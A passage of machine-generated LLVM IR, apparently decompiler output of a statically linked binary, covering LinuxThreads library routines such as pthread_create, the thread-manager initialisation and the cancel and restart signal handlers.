  store i32 268517940, i32* @lr, align 4
  %v2_10014230 = call i32 @__GI_sigaddset(i32 %v2_1001421c, i32 %v3_10014228)
  store i32 268517956, i32* @lr, align 4
  %v3_10014240 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_1001421c, i32 0)
  store i32 %v2_1001421c, i32* @r3, align 4
  store i32 268517968, i32* @lr, align 4
  %v1_1001424c = call i32 @__GI_sigdelset(i32 %v2_1001421c)
  %v3_10014250 = load i32, i32* @global_var_10045108.994, align 4
  store i32 %v2_1001421c, i32* @r3, align 4
  store i32 268517980, i32* @lr, align 4
  %v2_10014258 = call i32 @__GI_sigaddset(i32 %v2_1001421c, i32 %v3_10014250)
  store i32 268517996, i32* @lr, align 4
  %v3_10014268 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_1001421c, i32 0)
  store i32 268518012, i32* @lr, align 4
  %v2_10014278 = call i32 @on_exit(i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 16088), i32 0)
  br label %dec_label_pc_1001427c

dec_label_pc_1001427c:                            ; preds = %entry, %dec_label_pc_1001421c
  %.0 = phi i32 [ %v2_10014278, %dec_label_pc_1001421c ], [ undef, %entry ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v2_1001421c, { 0, 2, 1, 4, 3, 5, 7, 6, 9, 8, 10 }
  uselistorder i32 %v2_10014188, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v2_10014168, { 1, 2, 0 }
  uselistorder i32 %v3_10014140, { 1, 2, 0 }
  uselistorder i32* %stack_var_-176, { 1, 3, 0, 4, 2, 5 }
  uselistorder i32* @global_var_1004522c.992, { 1, 0 }
  uselistorder label %dec_label_pc_1001427c, { 1, 0 }
  uselistorder label %dec_label_pc_1001421c, { 1, 0 }
  uselistorder label %dec_label_pc_10014188, { 1, 0 }
  uselistorder label %dec_label_pc_10014140, { 1, 0 }
  uselistorder label %dec_label_pc_10014130, { 1, 0 }
}

define i32 @__pthread_initialize_manager(i32 %arg1) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %v3_100142a8 = load i32, i32* @global_var_100451f0.1005, align 4
  %v2_100142ac = inttoptr i32 %v3_100142a8 to i32*
  store i32 1, i32* %v2_100142ac, align 4
  %v3_100142b4 = load i32, i32* @global_var_100451dc.996, align 4
  %v3_100142b8 = icmp eq i32 %v3_100142b4, 0
  br i1 %v3_100142b8, label %dec_label_pc_100142c0, label %dec_label_pc_100142c4

dec_label_pc_100142c0:                            ; preds = %entry
  store i32 268518084, i32* @lr, align 4
  %v1_100142c0 = call i32 @pthread_initialize(i32 268697600)
  br label %dec_label_pc_100142c4

dec_label_pc_100142c4:                            ; preds = %entry, %dec_label_pc_100142c0
  store i32 268697600, i32* %r30.global-to-local, align 4
  %v3_100142cc = load i32, i32* @global_var_10045254.1006, align 4
  %v1_100142d0 = mul i32 %v3_100142cc, 2
  %v1_100142d4 = add i32 %v1_100142d0, -32
  store i32 %v1_100142d4, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100142dc.1007 to i32), i32* @lr, align 4
  %v0_100142d8 = call i32 @malloc()
  %v3_100142e0 = icmp eq i32 %v0_100142d8, 0
  store i32 %v0_100142d8, i32* @global_var_100451e0.988, align 4
  br i1 %v3_100142e0, label %dec_label_pc_100144b4, label %dec_label_pc_100142ec

dec_label_pc_100142ec:                            ; preds = %dec_label_pc_100142c4
  %v3_100142ec = load i32, i32* @global_var_10045254.1006, align 4
  %v1_100142f4 = mul i32 %v3_100142ec, 2
  %v2_100142fc = ptrtoint i32* %stack_var_-184 to i32
  %v2_100142f8 = add i32 %v0_100142d8, -32
  %v1_10014300 = add i32 %v2_100142f8, %v1_100142f4
  store i32 %v1_10014300, i32* @global_var_100451e4.989, align 4
  store i32 268518156, i32* @lr, align 4
  %v2_10014308 = call i32 @__GI_pipe(i32 %v2_100142fc, i32 %v1_10014300)
  %v3_1001430c = icmp eq i32 %v2_10014308, -1
  br i1 %v3_1001430c, label %dec_label_pc_10014314, label %dec_label_pc_10014320

dec_label_pc_10014314:                            ; preds = %dec_label_pc_100142ec
  %v3_10014314 = load i32, i32* @global_var_100451e0.988, align 4
  store i32 %v3_10014314, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1001431c.1008 to i32), i32* @lr, align 4
  %v0_10014318 = call i32 @free()
  br label %dec_label_pc_1001441c

dec_label_pc_10014320:                            ; preds = %dec_label_pc_100142ec
  %v3_10014324 = load i32, i32* @global_var_100451f8.1009, align 4
  %v3_10014328 = icmp eq i32 %v3_10014324, 0
  br i1 %v3_10014328, label %dec_label_pc_10014338thread-pre-split, label %dec_label_pc_10014330

dec_label_pc_10014330:                            ; preds = %dec_label_pc_10014320
  store i32 %v3_10014324, i32* @global_var_10040a7c.1010, align 4
  br label %dec_label_pc_10014338

dec_label_pc_10014338thread-pre-split:            ; preds = %dec_label_pc_10014320
  %v3_10014340.pr = load i32, i32* @global_var_10040a7c.1010, align 4
  br label %dec_label_pc_10014338

dec_label_pc_10014338:                            ; preds = %dec_label_pc_10014338thread-pre-split, %dec_label_pc_10014330
  %v3_10014340 = phi i32 [ %v3_10014340.pr, %dec_label_pc_10014338thread-pre-split ], [ %v3_10014324, %dec_label_pc_10014330 ]
  %v3_10014344 = icmp eq i32 %v3_10014340, 0
  br i1 %v3_10014344, label %dec_label_pc_100143d4, label %dec_label_pc_1001434c

dec_label_pc_1001434c:                            ; preds = %dec_label_pc_10014338
  %v3_10014350 = load i32, i32* @global_var_10045210.1011, align 4
  %v3_10014354 = load i32, i32* @global_var_10040a80.1012, align 4
  %v2_10014358 = or i32 %v3_10014354, %v3_10014350
  %v1_1001435c = and i32 %v2_10014358, 128
  %v3_1001435c = icmp eq i32 %v1_1001435c, 0
  br i1 %v3_1001435c, label %dec_label_pc_100143d4, label %dec_label_pc_10014364

dec_label_pc_10014364:                            ; preds = %dec_label_pc_1001434c
  store i32 0, i32* @r4, align 4
  %v3_10014370 = load i32, i32* bitcast (i32** @global_var_10040adc.1015 to i32*), align 4
  store i32 %v3_10014370, i32* @r3, align 4
  store i32 268518264, i32* @lr, align 4
  %v0_10014374 = call i32 @__pthread_lock()
  %v3_10014378 = load i32, i32* @global_var_100451e4.989, align 4
  %v3_1001437c = load i32, i32* %stack_var_-184, align 4
  store i32 268518292, i32* @lr, align 4
  %v4_10014390 = call i32 @clone(i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26312), i32 %v3_10014378, i32 3840, i32 %v3_1001437c)
  store i32 %v4_10014390, i32* @r3, align 4
  %v3_10014394 = icmp eq i32 %v4_10014390, -1
  store i32 %v4_10014390, i32* %r30.global-to-local, align 4
  br i1 %v3_10014394, label %dec_label_pc_100143c4, label %dec_label_pc_100143a0

dec_label_pc_100143a0:                            ; preds = %dec_label_pc_10014364
  %v0_100143a4 = load i32, i32* @r31, align 4
  store i32 %v0_100143a4, i32* @global_var_10040c6c.1016, align 4
  store i32 8, i32* @global_var_10040c68.1017, align 4
  store i32 2049, i32* @global_var_10040ad0.1018, align 4
  store i32 %v4_10014390, i32* @global_var_10040ad4.986, align 4
  store i32 %v0_100143a4, i32* @global_var_10045218.1019, align 4
  %v1_100143c0 = call i32 @__linuxthreads_create_event(i32 268697600)
  br label %dec_label_pc_100143c4

dec_label_pc_100143c4:                            ; preds = %dec_label_pc_10014364, %dec_label_pc_100143a0
  %v3_100143c4 = load i32, i32* bitcast (i32** @global_var_10040adc.1015 to i32*), align 4
  store i32 %v3_100143c4, i32* @r3, align 4
  store i32 268518348, i32* @lr, align 4
  %v0_100143c8 = call i32 @__pthread_unlock()
  %v0_100143cc = load i32, i32* %r30.global-to-local, align 4
  %v3_100143cc = icmp eq i32 %v0_100143cc, 0
  br i1 %v3_100143cc, label %dec_label_pc_100143d4, label %dec_label_pc_100143f8

dec_label_pc_100143d4:                            ; preds = %dec_label_pc_100143c4, %dec_label_pc_1001434c, %dec_label_pc_10014338
  %v3_100143d8 = load i32, i32* %stack_var_-184, align 4
  %v3_100143dc = load i32, i32* @global_var_100451e4.989, align 4
  store i32 268518388, i32* @lr, align 4
  %v4_100143f0 = call i32 @clone(i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 24564), i32 %v3_100143dc, i32 3840, i32 %v3_100143d8)
  store i32 %v4_100143f0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100143f8

dec_label_pc_100143f8:                            ; preds = %dec_label_pc_100143c4, %dec_label_pc_100143d4
  %v0_10014440 = phi i32 [ %v4_100143f0, %dec_label_pc_100143d4 ], [ %v0_100143cc, %dec_label_pc_100143c4 ]
  %v3_100143f8 = icmp eq i32 %v0_10014440, -1
  br i1 %v3_100143f8, label %dec_label_pc_10014400, label %dec_label_pc_10014424

dec_label_pc_10014400:                            ; preds = %dec_label_pc_100143f8
  %v3_10014404 = load i32, i32* @global_var_100451e0.988, align 4
  store i32 %v3_10014404, i32* @r3, align 4
  store i32 268518412, i32* @lr, align 4
  %v0_10014408 = call i32 @free()
  %v3_1001440c = load i32, i32* %stack_var_-184, align 4
  store i32 268518420, i32* @lr, align 4
  %v1_10014410 = call i32 @__libc_close(i32 %v3_1001440c)
  store i32 ptrtoint (i32* @global_var_1001441c.1020 to i32), i32* @lr, align 4
  %v1_10014418 = call i32 @__libc_close(i32 %tmp2)
  br label %dec_label_pc_1001441c

dec_label_pc_1001441c:                            ; preds = %dec_label_pc_10014314, %dec_label_pc_10014400
  br label %dec_label_pc_100144b4

dec_label_pc_10014424:                            ; preds = %dec_label_pc_100143f8
  %v3_1001442c = load i32, i32* @global_var_1004521c.1021, align 4
  %v3_10014438 = icmp eq i32 %v3_1001442c, 0
  store i32 %v0_10014440, i32* @global_var_10040ad4.986, align 4
  store i32 %tmp2, i32* @global_var_100450e4.985, align 4
  %v3_1001444c = load i32, i32* %stack_var_-184, align 4
  store i32 %v3_1001444c, i32* @global_var_100451fc.990, align 4
  store i32 2049, i32* @global_var_10040ad0.1018, align 4
  br i1 %v3_10014438, label %dec_label_pc_1001447c, label %dec_label_pc_10014460

dec_label_pc_10014460:                            ; preds = %dec_label_pc_10014424
  %v3_10014464 = load i32, i32* @global_var_1004510c.995, align 4
  %tmp8 = icmp slt i32 %v3_10014464, 1
  br i1 %tmp8, label %dec_label_pc_1001447c, label %dec_label_pc_10014470

dec_label_pc_10014470:                            ; preds = %dec_label_pc_10014460
  store i32 268518516, i32* @lr, align 4
  %v1_10014470 = call i32 @__GI_raise(i32 %v3_10014464)
  %v0_10014474 = load i32, i32* @r2, align 4
  store i32 %v0_10014474, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1001447c.1022 to i32), i32* @lr, align 4
  %v0_10014478 = call i32 @__pthread_wait_for_restart_signal()
  br label %dec_label_pc_1001447c

dec_label_pc_1001447c:                            ; preds = %dec_label_pc_10014460, %dec_label_pc_10014424, %dec_label_pc_10014470
  %v2_10014488 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_10014484

dec_label_pc_10014484:                            ; preds = %dec_label_pc_100144a0, %dec_label_pc_1001447c
  %v3_1001448c = load i32, i32* @global_var_100450e4.985, align 4
  store i32 268518552, i32* @lr, align 4
  %v2_10014494 = call i32 @__libc_write(i32 %v3_1001448c, i32 %v2_10014488)
  %v3_10014498 = icmp eq i32 %v2_10014494, -1
  br i1 %v3_10014498, label %dec_label_pc_100144a0, label %dec_label_pc_100144b0

dec_label_pc_100144a0:                            ; preds = %dec_label_pc_10014484
  %v0_100144a0 = call i32 @__errno_location()
  %v1_100144a4 = inttoptr i32 %v0_100144a0 to i32*
  %v2_100144a4 = load i32, i32* %v1_100144a4, align 4
  %v3_100144a8 = icmp eq i32 %v2_100144a4, 4
  br i1 %v3_100144a8, label %dec_label_pc_10014484, label %dec_label_pc_100144b0

dec_label_pc_100144b0:                            ; preds = %dec_label_pc_10014484, %dec_label_pc_100144a0
  br label %dec_label_pc_100144b4

dec_label_pc_100144b4:                            ; preds = %dec_label_pc_100142c4, %dec_label_pc_1001441c, %dec_label_pc_100144b0
  %v0_100144b4 = phi i32 [ -1, %dec_label_pc_100142c4 ], [ -1, %dec_label_pc_1001441c ], [ 0, %dec_label_pc_100144b0 ]
  ret i32 %v0_100144b4

; uselistorder directives
  uselistorder i32 %v3_10014324, { 1, 0, 2 }
  uselistorder i32 %tmp2, { 1, 0 }
  uselistorder label %dec_label_pc_100144b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100144b0, { 1, 0 }
  uselistorder label %dec_label_pc_1001447c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001441c, { 1, 0 }
  uselistorder label %dec_label_pc_100143f8, { 1, 0 }
  uselistorder label %dec_label_pc_100143c4, { 1, 0 }
  uselistorder label %dec_label_pc_100142c4, { 1, 0 }
}

define i32 @__pthread_initialize() local_unnamed_addr {
entry:
  %v0_100144cc = load i32, i32* @r3, align 4
  %v1_100144cc = call i32 @pthread_initialize(i32 %v0_100144cc)
  ret i32 %v1_100144cc

; uselistorder directives
  uselistorder i32 (i32)* @pthread_initialize, { 1, 0 }
}

define i32 @__pthread_initialize_minimal(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_100408e0 to i32), i32* @r2, align 4
  %v2_100144e8 = call i32 @__libc_pthread_init(i32 0, i32 268697600)
  store i32 %v2_100144e8, i32* @global_var_100451f0.1005, align 4
  ret i32 %v2_100144e8
}

define i32 @pthread_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  store i32 %tmp, i32* @r27, align 4
  %v3_10014528 = load i32, i32* @global_var_100450e4.985, align 4
  %v0_1001452c = load i32, i32* @r2, align 4
  store i32 %v0_1001452c, i32* @r31, align 4
  %tmp13 = icmp sgt i32 %v3_10014528, -1
  br i1 %tmp13, label %dec_label_pc_10014548, label %dec_label_pc_10014538

dec_label_pc_10014538:                            ; preds = %entry
  store i32 268518716, i32* @lr, align 4
  %v1_10014538 = call i32 @__pthread_initialize_manager(i32 268697600)
  %v1_1001453c = icmp slt i32 %v1_10014538, 0
  br i1 %v1_1001453c, label %dec_label_pc_100145bc, label %dec_label_pc_10014538.dec_label_pc_10014548_crit_edge

dec_label_pc_10014538.dec_label_pc_10014548_crit_edge: ; preds = %dec_label_pc_10014538
  %v0_10014568.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10014548

dec_label_pc_10014548:                            ; preds = %dec_label_pc_10014538.dec_label_pc_10014548_crit_edge, %entry
  %v0_10014568 = phi i32 [ %v0_10014568.pre, %dec_label_pc_10014538.dec_label_pc_10014548_crit_edge ], [ %v0_1001452c, %entry ]
  %v2_10014554 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v0_10014568, i32* %stack_var_-184, align 4
  store i32 268518768, i32* @lr, align 4
  %v3_1001456c = call i32 @__GI_sigprocmask(i32 2, i32 0, i32 %v2_10014554)
  %v2_10014574 = ptrtoint i32* %stack_var_-184 to i32
  br label %dec_label_pc_10014570

dec_label_pc_10014570:                            ; preds = %dec_label_pc_1001458c, %dec_label_pc_10014548
  %v3_10014578 = load i32, i32* @global_var_100450e4.985, align 4
  store i32 268518788, i32* @lr, align 4
  %v2_10014580 = call i32 @__libc_write(i32 %v3_10014578, i32 %v2_10014574)
  %v3_10014584 = icmp eq i32 %v2_10014580, -1
  br i1 %v3_10014584, label %dec_label_pc_1001458c, label %dec_label_pc_1001459c

dec_label_pc_1001458c:                            ; preds = %dec_label_pc_10014570
  %v0_1001458c = call i32 @__errno_location()
  %v1_10014590 = inttoptr i32 %v0_1001458c to i32*
  %v2_10014590 = load i32, i32* %v1_10014590, align 4
  %v3_10014594 = icmp eq i32 %v2_10014590, 4
  br i1 %v3_10014594, label %dec_label_pc_10014570, label %dec_label_pc_1001459c

dec_label_pc_1001459c:                            ; preds = %dec_label_pc_10014570, %dec_label_pc_1001458c
  %v0_1001459c = load i32, i32* @r31, align 4
  store i32 %v0_1001459c, i32* @r3, align 4
  store i32 268518820, i32* @lr, align 4
  %v1_100145a0 = call i32 @suspend(i32 %v0_1001459c)
  %v0_100145a4 = load i32, i32* @r31, align 4
  %v1_100145a4 = add i32 %v0_100145a4, 52
  %v2_100145a4 = inttoptr i32 %v1_100145a4 to i32*
  %v3_100145a4 = load i32, i32* %v2_100145a4, align 4
  %v3_100145a8 = icmp eq i32 %v3_100145a4, 0
  br i1 %v3_100145a8, label %dec_label_pc_100145b0, label %dec_label_pc_100145b8

dec_label_pc_100145b0:                            ; preds = %dec_label_pc_1001459c
  %v1_100145b0 = add i32 %v0_100145a4, 48
  %v2_100145b0 = inttoptr i32 %v1_100145b0 to i32*
  %v3_100145b0 = load i32, i32* %v2_100145b0, align 4
  %v1_100145b4 = load i32, i32* @r27, align 4
  %v2_100145b4 = inttoptr i32 %v1_100145b4 to i32*
  store i32 %v3_100145b0, i32* %v2_100145b4, align 4
  %v0_100145b8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100145b8

dec_label_pc_100145b8:                            ; preds = %dec_label_pc_1001459c, %dec_label_pc_100145b0
  %v0_100145b8 = phi i32 [ %v0_100145a4, %dec_label_pc_1001459c ], [ %v0_100145b8.pre, %dec_label_pc_100145b0 ]
  %v1_100145b8 = add i32 %v0_100145b8, 52
  %v2_100145b8 = inttoptr i32 %v1_100145b8 to i32*
  %v3_100145b8 = load i32, i32* %v2_100145b8, align 4
  br label %dec_label_pc_100145bc

dec_label_pc_100145bc:                            ; preds = %dec_label_pc_10014538, %dec_label_pc_100145b8
  %v0_100145cc = phi i32 [ 11, %dec_label_pc_10014538 ], [ %v3_100145b8, %dec_label_pc_100145b8 ]
  ret i32 %v0_100145cc

; uselistorder directives
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder label %dec_label_pc_100145bc, { 1, 0 }
  uselistorder label %dec_label_pc_100145b8, { 1, 0 }
  uselistorder label %dec_label_pc_1001459c, { 1, 0 }
}

define i32 @pthread_handle_sigcancel() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10040ac0.1013 to i32), i32* %r9.global-to-local, align 4
  %v4_100145dc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100145dc, i32* %stack_var_-16, align 4
  %v5_100145dc = ptrtoint i32* %stack_var_-16 to i32
  %v0_100145e0 = load i32, i32* @r2, align 4
  %v4_100145e0 = icmp eq i32 %v0_100145e0, ptrtoint (i32* @global_var_10040ac0.1013 to i32)
  store i32 %v0_100145e0, i32* %r11.global-to-local, align 4
  br i1 %v4_100145e0, label %dec_label_pc_100145f0, label %dec_label_pc_1001465c

dec_label_pc_100145f0:                            ; preds = %entry
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_100145f8 = load i32, i32* @global_var_100451e0.988, align 4
  %v2_100145fc = icmp ult i32 %v5_100145dc, %v3_100145f8
  br i1 %v2_100145fc, label %dec_label_pc_10014624, label %dec_label_pc_10014604

dec_label_pc_10014604:                            ; preds = %dec_label_pc_100145f0
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10014608 = load i32, i32* @global_var_100451e4.989, align 4
  %v2_1001460c = icmp ult i32 %v5_100145dc, %v3_10014608
  br i1 %v2_1001460c, label %dec_label_pc_1001463c, label %dec_label_pc_10014624

dec_label_pc_10014620:                            ; preds = %dec_label_pc_10014630, %dec_label_pc_10014624
  %v1_10014620 = add i32 %v0_10014620, 16
  br label %dec_label_pc_10014624

dec_label_pc_10014624:                            ; preds = %dec_label_pc_100145f0, %dec_label_pc_10014604, %dec_label_pc_10014620
  %v0_10014620 = phi i32 [ %v1_10014620, %dec_label_pc_10014620 ], [ ptrtoint (i32* @global_var_10040d80.1023 to i32), %dec_label_pc_10014604 ], [ ptrtoint (i32* @global_var_10040d80.1023 to i32), %dec_label_pc_100145f0 ]
  store i32 %v0_10014620, i32* %r9.global-to-local, align 4
  %v1_10014624 = add i32 %v0_10014620, 8
  %v2_10014624 = inttoptr i32 %v1_10014624 to i32*
  %v3_10014624 = load i32, i32* %v2_10014624, align 4
  store i32 %v3_10014624, i32* %r11.global-to-local, align 4
  %v3_10014628 = icmp ugt i32 %v5_100145dc, %v3_10014624
  br i1 %v3_10014628, label %dec_label_pc_10014620, label %dec_label_pc_10014630

dec_label_pc_10014630:                            ; preds = %dec_label_pc_10014624
  %v1_10014630 = add i32 %v0_10014620, 12
  %v2_10014630 = inttoptr i32 %v1_10014630 to i32*
  %v3_10014630 = load i32, i32* %v2_10014630, align 4
  %v2_10014634 = icmp ult i32 %v5_100145dc, %v3_10014630
  br i1 %v2_10014634, label %dec_label_pc_10014620, label %dec_label_pc_1001463c.loopexit

dec_label_pc_1001463c.loopexit:                   ; preds = %dec_label_pc_10014630
  br label %dec_label_pc_1001463c

dec_label_pc_1001463c:                            ; preds = %dec_label_pc_1001463c.loopexit, %dec_label_pc_10014604
  %v0_10014654 = phi i32 [ %v3_10014624, %dec_label_pc_1001463c.loopexit ], [ ptrtoint (i32* @global_var_10040ac0.1013 to i32), %dec_label_pc_10014604 ]
  store i32 ptrtoint (i32* @global_var_10040ac0.1013 to i32), i32* %r9.global-to-local, align 4
  %v4_10014644 = icmp eq i32 %v0_10014654, ptrtoint (i32* @global_var_10040ac0.1013 to i32)
  br i1 %v4_10014644, label %dec_label_pc_1001464c, label %dec_label_pc_10014654

dec_label_pc_1001464c:                            ; preds = %dec_label_pc_1001463c
  store i32 ptrtoint (i32* @global_var_10014650.1024 to i32), i32* @lr, align 4
  %v1_1001464c = call i32 @__pthread_manager_sighandler(i32 ptrtoint (i32* @global_var_10040ac0.1013 to i32))
  store i32 %v1_1001464c, i32* @r3, align 4
  br label %dec_label_pc_100146e4

dec_label_pc_10014654:                            ; preds = %dec_label_pc_1001463c
  store i32 %v0_10014654, i32* @r2, align 4
  store i32 %v0_10014654, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001465c

dec_label_pc_1001465c:                            ; preds = %entry, %dec_label_pc_10014654
  %v0_10014674 = phi i32 [ %v0_100145e0, %entry ], [ %v0_10014654, %dec_label_pc_10014654 ]
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10014660 = load i32, i32* @global_var_100451e8.1025, align 4
  %v3_10014664 = icmp eq i32 %v3_10014660, 0
  br i1 %v3_10014664, label %dec_label_pc_1001469c, label %dec_label_pc_1001466c

dec_label_pc_1001466c:                            ; preds = %dec_label_pc_1001465c
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10014670 = load i32, i32* @global_var_100450e0, align 4
  %v4_10014674 = icmp eq i32 %v0_10014674, %v3_10014670
  br i1 %v4_10014674, label %dec_label_pc_1001467c, label %dec_label_pc_10014690

dec_label_pc_1001467c:                            ; preds = %dec_label_pc_1001466c
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10014684 = load i32, i32* @global_var_10040ad4.986, align 4
  store i32 268519056, i32* @lr, align 4
  %v3_1001468c = call i32 @waitpid(i32 %v3_10014684, i32 0, i32 -2147483648)
  br label %dec_label_pc_10014690

dec_label_pc_10014690:                            ; preds = %dec_label_pc_1001466c, %dec_label_pc_1001467c
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10014694 = load i32, i32* @global_var_100451ec.1026, align 4
  %v1_10014698 = call i32 @__GI__exit(i32 %v3_10014694)
  store i32 %v1_10014698, i32* @r3, align 4
  %v0_1001469c.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1001469c

dec_label_pc_1001469c:                            ; preds = %dec_label_pc_1001465c, %dec_label_pc_10014690
  %v0_100146b4 = phi i32 [ %v0_10014674, %dec_label_pc_1001465c ], [ %v0_1001469c.pre, %dec_label_pc_10014690 ]
  %v1_1001469c = add i32 %v0_100146b4, 66
  %v2_1001469c = inttoptr i32 %v1_1001469c to i8*
  %v3_1001469c = load i8, i8* %v2_1001469c, align 1
  %v3_100146a0 = icmp eq i8 %v3_1001469c, 0
  br i1 %v3_100146a0, label %dec_label_pc_100146e4, label %dec_label_pc_100146a8

dec_label_pc_100146a8:                            ; preds = %dec_label_pc_1001469c
  %v1_100146a8 = add i32 %v0_100146b4, 64
  %v2_100146a8 = inttoptr i32 %v1_100146a8 to i8*
  %v3_100146a8 = load i8, i8* %v2_100146a8, align 1
  %v4_100146a8 = zext i8 %v3_100146a8 to i32
  store i32 %v4_100146a8, i32* %r9.global-to-local, align 4
  %v3_100146ac = icmp eq i8 %v3_100146a8, 0
  br i1 %v3_100146ac, label %dec_label_pc_100146b4, label %dec_label_pc_100146e4

dec_label_pc_100146b4:                            ; preds = %dec_label_pc_100146a8
  %v1_100146b4 = add i32 %v0_100146b4, 65
  %v2_100146b4 = inttoptr i32 %v1_100146b4 to i8*
  %v3_100146b4 = load i8, i8* %v2_100146b4, align 1
  %v3_100146b8 = icmp eq i8 %v3_100146b4, 1
  br i1 %v3_100146b8, label %dec_label_pc_100146c0, label %dec_label_pc_100146cc

dec_label_pc_100146c0:                            ; preds = %dec_label_pc_100146b4
  %v0_100146c8 = call i32 @__pthread_do_exit()
  %v0_100146cc.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100146cc

dec_label_pc_100146cc:                            ; preds = %dec_label_pc_100146b4, %dec_label_pc_100146c0
  %v1_100146d8 = phi i32 [ %v0_100146b4, %dec_label_pc_100146b4 ], [ %v0_100146cc.pre, %dec_label_pc_100146c0 ]
  %v1_100146cc = add i32 %v1_100146d8, 40
  %v2_100146cc = inttoptr i32 %v1_100146cc to i32*
  %v3_100146cc = load i32, i32* %v2_100146cc, align 4
  store i32 %v3_100146cc, i32* @r3, align 4
  %v3_100146d0 = icmp eq i32 %v3_100146cc, 0
  br i1 %v3_100146d0, label %dec_label_pc_100146e4, label %dec_label_pc_100146d8

dec_label_pc_100146d8:                            ; preds = %dec_label_pc_100146cc
  %v0_100146d8 = load i32, i32* %r9.global-to-local, align 4
  store i32 %v0_100146d8, i32* %v2_100146cc, align 4
  store i32 268519140, i32* @lr, align 4
  %v0_100146e0 = load i32, i32* @r3, align 4
  %v2_100146e0 = call i32 @siglongjmp(i32 %v0_100146e0, i32 1)
  store i32 %v2_100146e0, i32* @r3, align 4
  br label %dec_label_pc_100146e4

dec_label_pc_100146e4:                            ; preds = %dec_label_pc_100146a8, %dec_label_pc_100146cc, %dec_label_pc_1001469c, %dec_label_pc_1001464c, %dec_label_pc_100146d8
  %v0_100146f0 = load i32, i32* @r3, align 4
  ret i32 %v0_100146f0

; uselistorder directives
  uselistorder i32 %v0_10014654, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10014620, { 1, 2, 3, 0 }
  uselistorder i32 %v5_100145dc, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 10, 9 }
  uselistorder i32* %r11.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_100146e4, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_100146cc, { 1, 0 }
  uselistorder label %dec_label_pc_1001469c, { 1, 0 }
  uselistorder label %dec_label_pc_10014690, { 1, 0 }
  uselistorder label %dec_label_pc_1001465c, { 1, 0 }
  uselistorder label %dec_label_pc_10014624, { 2, 1, 0 }
}

define i32 @pthread_handle_sigrestart(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_10014700 = load i32, i32* @r2, align 4
  %v2_10014700 = add i32 %v1_10014700, 32
  %v3_10014700 = inttoptr i32 %v2_10014700 to i32*
  store i32 %arg1, i32* %v3_10014700, align 4
  %v0_10014704 = load i32, i32* @r2, align 4
  %v1_10014704 = add i32 %v0_10014704, 36
  %v2_10014704 = inttoptr i32 %v1_10014704 to i32*
  %v3_10014704 = load i32, i32* %v2_10014704, align 4
  %v3_10014708 = icmp eq i32 %v3_10014704, 0
  br i1 %v3_10014708, label %entry.dec_label_pc_1001471c_crit_edge, label %dec_label_pc_10014710

entry.dec_label_pc_1001471c_crit_edge:            ; preds = %entry
  %v0_10014728.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001471c

dec_label_pc_10014710:                            ; preds = %entry
  store i32 %v3_10014704, i32* %r3.global-to-local, align 4
  store i32 268519196, i32* @lr, align 4
  %v2_10014718 = call i32 @siglongjmp(i32 %v3_10014704, i32 1)
  store i32 %v2_10014718, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001471c

dec_label_pc_1001471c:                            ; preds = %entry.dec_label_pc_1001471c_crit_edge, %dec_label_pc_10014710
  %v0_10014728 = phi i32 [ %v0_10014728.pre, %entry.dec_label_pc_1001471c_crit_edge ], [ %v2_10014718, %dec_label_pc_10014710 ]
  ret i32 %v0_10014728

; uselistorder directives
  uselistorder i32 %v3_10014704, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @siglongjmp, { 1, 0 }
  uselistorder label %dec_label_pc_1001471c, { 1, 0 }
}

define i32 @__GI_pthread_getschedparam(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
